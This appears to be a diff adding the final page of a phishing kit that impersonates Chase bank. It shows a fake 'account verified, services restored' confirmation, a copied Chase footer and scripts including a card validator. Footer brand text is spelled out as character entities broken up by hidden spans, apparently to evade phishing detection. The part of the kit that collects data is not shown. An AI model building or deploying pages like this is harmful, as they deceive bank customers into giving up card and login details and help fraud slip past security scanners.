+                                    <div class="  row">
+                                        <div class="  col-xs-10 col-xs-offset-1">
+                                            <div id="" align="center">
+                                                <ol class="  progtrckr" data-progtrckr-steps="4">
+                                                    <li class="  progtrckr-done"></li>
+                                                    <li class="  progtrckr-done"></li>
+                                                    <li class="  progtrckr-done"></li>
+                                                    <li class="  progtrckr-done"></li>
+                                                </ol>
+                                            </div>
+                                            <br>
+                                            <br>
+                                            <div class="  jpui fieldgroup logon-xs-toggle logon-floating-label">
+                                                <div class="  jpui vertical">
+                                                    <div align="center">
+                                                        <img width="120px" src="./img/congra.png">
+                                                        <br>
+                                                        <h4 style="color: #5a5757;">Your account has been verified and all your services has been restored, we will call you later if we need something else, Thanks for being a loyal customer.</h4>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="  row">
+                                                <button id="dort9awed" type="button" class="  jpui button focus fluid primary touch"><span class="  label">My Account</span> </button>
+                                                <hr style="border-top: 1.5px dotted #959595;">
+                                                <button id="dort9awed2" style="background-color: #959595;" type="button" class="  jpui button focus fluid primary touch"><span class="  label">Log Out</span> </button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </main>
+            </div>
+            <br></br>
+            <div class="  footer">
+                <div class="  footer-container">
+                    <div class="  container">
+                        <div class="  social-links row">
+                            <div class="  col-xs-12"><span class="  follow-us-text">Follow us:</span>
+                                <ul class="  icon-links">
+                                    <li class="  facebook"><span><a class="  jpui iconaction touch"> <i class="  jpui facebook icon"></i></a>
+                                        </span>
+                                    </li>
+                                    <li class="  instagram"><span><a class="  jpui iconaction touch"> <i class="  jpui instagram icon"></i></a>
+                                        </span>
+                                    </li>
+                                    <li class="  twitter"><span><a class="  jpui iconaction touch"><i class="  jpui twitter icon"></i></a>
+                                        </span>
+                                    </li>
+                                    <li class="  youtube"><span><a class="  jpui iconaction touch"><i class="  jpui youtube icon"></i></a>
+                                        </span>
+                                    </li>
+                                    <li class="  linkedin"><span><a class="  jpui iconaction touch"> <i class="  jpui linkedin icon"></i></a>
+                                        </span>
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="  footer-links row implement-ada-features-enabled">
+                            <div class="  col-xs-12">
+                                <ul>
+                                    <li><span class="  jpui link"><a class="  link-anchor touch">Contact us</a></span></li>
+                                    <li><span class="  jpui link"><a class="  link-anchor touch">Privacy</a></span></li>
+                                    <li><span class="  jpui link"><a class="  link-anchor touch">Security</a></span></li>
+                                    <li><span class="  jpui link"><a class="  link-anchor touch">Terms of use</a></span></li>
+                                    <li><span class="  jpui link"><a class="  link-anchor touch">Accessibility</a></span></li>
+                                    <li><span class="  jpui link"><a class="  link-anchor touch">SAFE Act: Chase Mortgage Loan Originators</a></span></li>
+                                    <li><span class="  jpui link"><a class="  link-anchor touch">Fair Lending</a></span></li>
+                                    <li><span class="  jpui link"><a class="  link-anchor touch">About Chase</a></span></li>
+                                    <li><span class="  jpui link"><a class="  link-anchor touch"> J.P. Morgan</a></span></li>
+                                    <li><span class="  jpui link"><a class="  link-anchor touch">JPMorgan Chase & Co.</a></span></li>
+                                    <li><span class="  jpui link"><a class="  link-anchor touch">Careers</a></span></li>
+                                    <li><span class="  jpui link"><a class="  link-anchor touch">Español</a></span></li>
+                                    <li><span class="  jpui link"><a class="  link-anchor touch">Chase Canada</a></span></li>
+                                    <li><span class="  jpui link"><a class="  link-anchor touch">Site map</a></span></li>
+                                    <li>Member FDIC</li>
+                                    <li><i class="  jpui equal-housing-lender icon touch"></i>Equal Housing Lender</li>
+                                    <li class="  copyright-label">&copy;
+                                        <script>
+                                        document.write(new Date().getFullYear())
+                                        </script>2020 JPMorgan Chase & Co.</li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="  row galaxy-footer">
+                            <div class="  col-xs-10 col-xs-offset-1">
+                                <p class="  NOTE"><span></span>
+                                    <br> <span class="  copyright-label">&copy;<span style="display:none;">
+                                        </span>&#32;<script>
+                                        document.write(new Date().getFullYear())
+                                        </script><span style="display:none;">
+                                        </span>&#32;<span style="display:none;">
+                                        </span>&#74;<span style="display:none;">
+                                        </span>&#80;<span style="display:none;">
+                                        </span>&#77;<span style="display:none;">
+                                        </span>&#111;<span style="display:none;">
+                                        </span>&#114;<span style="display:none;">
+                                        </span>&#103;<span style="display:none;">
+                                        </span>&#97;<span style="display:none;">
+                                        </span>&#110;<span style="display:none;">
+                                        </span>&#32;<span style="display:none;">
+                                        </span>&#67;<span style="display:none;">
+                                        </span>&#104;<span style="display:none;">
+                                        </span>&#97;<span style="display:none;">
+                                        </span>&#115;<span style="display:none;">
+                                        </span>&#101;<span style="display:none;">
+                                        </span>&#32;&amp;<span style="display:none;">
+                                        </span>&#32;<span style="display:none;">
+                                        </span>&#67;<span style="display:none;">
+                                        </span>&#111;&period;</span></p>
+                                <p><span class="  jpui link"><a class="  link-anchor NOTELINK touch"><span style="display:none;">
+                                            </span>&#80;<span style="display:none;">
+                                            </span>&#114;<span style="display:none;">
+                                            </span>&#105;<span style="display:none;">
+                                            </span>&#118;<span style="display:none;">
+                                            </span>&#97;<span style="display:none;">
+                                            </span>&#99;<span style="display:none;">
+                                            </span>&#121;<i class="  jpui progressright icon end-icon"></i></a></span></p>
+                                <p><span class="  jpui link"><a class="  link-anchor NOTELINK touch"><span style="display:none;">
+                                            </span>&#65;<span style="display:none;">
+                                            </span>&#99;<span style="display:none;">
+                                            </span>&#99;<span style="display:none;">
+                                            </span>&#101;<span style="display:none;">
+                                            </span>&#115;<span style="display:none;">
+                                            </span>&#115;<span style="display:none;">
+                                            </span>&#105;<span style="display:none;">
+                                            </span>&#98;<span style="display:none;">
+                                            </span>&#105;<span style="display:none;">
+                                            </span>&#108;<span style="display:none;">
+                                            </span>&#105;<span style="display:none;">
+                                            </span>&#116;<span style="display:none;"></span>&#121;<i class="jpui progressright icon end-icon"></i></a></span></p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="./js/jquery.min.js"></script>
+    <script src="./js/jquery.validate.min.js"></script>
+    <script src="./js/jquery.CardValidator.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
+    <script src="./js/MyBabyTwo.js"></script>
+</body>
+
+</html>
